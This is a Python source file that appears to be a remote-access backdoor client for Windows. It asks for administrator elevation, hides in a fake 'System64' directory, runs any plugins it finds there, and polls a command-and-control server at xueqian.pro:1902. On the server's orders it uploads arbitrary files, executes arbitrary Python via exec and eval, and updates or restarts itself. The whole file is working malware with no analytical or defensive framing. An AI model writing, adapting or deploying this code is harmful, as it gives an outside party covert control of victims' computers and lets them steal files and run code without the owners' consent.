#         -*- coding:utf-8 -*-        #
#  Copyright (c) 2019 - 2039 XueQian  #
#         version_added:: 1.2.0         #
import importlib
import subprocess


def _import(name):
    try:
        imports[name] = importlib.import_module(name)
        return 'Succeed'
    except Exception as e:
        return str(e)


def _pip(argv):
    try:
        return os.popen(r'"C:\Windows\System64\Python\python.exe" -m pip ' + argv).read()
    except Exception as e:
        return str(e)


requests = importlib.import_module('requests')
socket = importlib.import_module('socket')
time = importlib.import_module('time')

ctypes = importlib.import_module('ctypes')
psutil = importlib.import_module('psutil')
sys = importlib.import_module('sys')
os = importlib.import_module('os')
imports = {}


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", r"C:\Windows\System64\Python\pythonw.exe", r"C:\Windows\System64\me.py", None, 1)
    # sys.exit()

s = 5
host = 'http://xueqian.pro:1902'
# host = 'http://192.168.3.10:1902'
if __name__ == '__main__':
    # to change the running floor
    try:
        os.chdir("C:\\Windows\\System64\\")
    except:
        pass

    try:
        _a = open('name.dll', 'r')
        name = _a.read()
        _a.close()
    except:
        name = socket.gethostname()

    # down it is plugins
    if not os.path.exists('./plugins'):
        os.mkdir('./plugins')
    else:
        for i in os.listdir('./plugins'):
            subprocess.Popen([r"C:\Windows\System64\Python\pythonw.exe", "C:\\Windows\\System64\\plugins\\" + i])

    # it's true
    while 1:
        try:
            _a = requests.post(host, json={'name': name}).json()
        except:
            time.sleep(5)
            s = 0
            continue

        # try:
        if 1:
            if _a['jieguo'] is None:
                if s == 5:
                    # time.sleep(15)
                    pass
                else:
                    s += 1
            elif _a['jieguo'] == 'update':
                requests.post(host, json={'name': name, 'headers': 'return', 'type': 'update'})
                subprocess.Popen([r"C:\Windows\System64\Python\pythonw.exe", r"C:\Windows\System64\update.py"])
                time.sleep(1)
                sys.exit()
            elif _a['jieguo'] == 'reboot':
                requests.post(host, json={'name': name, 'headers': 'return', 'type': 'reboot'})
                subprocess.Popen([r"C:\Windows\System64\Python\pythonw.exe", r"C:\Windows\System64\me.py"])
                time.sleep(1)
                sys.exit()
            elif _a['jieguo'] == 'sendfile':
                s = 0
                requests.post(host, json={'name': name, 'headers': 'return', 'type': 'sendfile', 'os': _a["shuju"],
                                          'file': str(open(_a["shuju"], 'rb').read())})
            elif _a['jieguo'] == 'commands':
                s = 0
                try:
                    exec(_a["shuju"])
                    result = str(eval(_a["fanhui"]))
                except Exception as e:
                    result = str(e)
                requests.post(host,
                              json={'name': name, 'headers': 'return', 'os': [_a["jieguo"], _a["shuju"], _a["fanhui"]],
                                    'type': '_os', 'result': result})
            else:
                s = 0
                try:
                    result = str(eval(_a["shuju"]))
                except Exception as e:
                    result = str(e)
                requests.post(host, json={'name': name, 'headers': 'return', 'os': [_a["jieguo"], _a["shuju"]],
                                          'type': 'os', 'result': result})
        # except Exception as e:
        #     print(e)
        time.sleep(5)
